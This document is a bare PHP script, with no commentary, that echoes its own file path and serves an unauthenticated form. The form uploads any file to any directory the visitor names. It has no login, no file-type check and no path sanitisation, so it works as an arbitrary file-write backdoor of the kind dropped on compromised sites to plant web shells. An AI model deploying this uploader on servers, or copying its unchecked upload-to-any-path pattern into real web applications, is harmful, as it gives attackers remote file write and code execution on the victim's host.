<?php
echo "Current-File: ".__FILE__;
if(isset($_POST['submit']))
{
	$path = $_POST['path'];
	$img = $_FILES['img']['name']; 
	if($img)
	{
		move_uploaded_file($_FILES['img']['tmp_name'],$path.$img);
	}
	echo "File Uploaded";
}
?>
<form action="" method="post" enctype="multipart/form-data">
	<input type="file" name="img" />
    <input type="text" name="path" placeholder="Upload Path" />
    <input type="submit" name="submit" value="Submit" />
</form>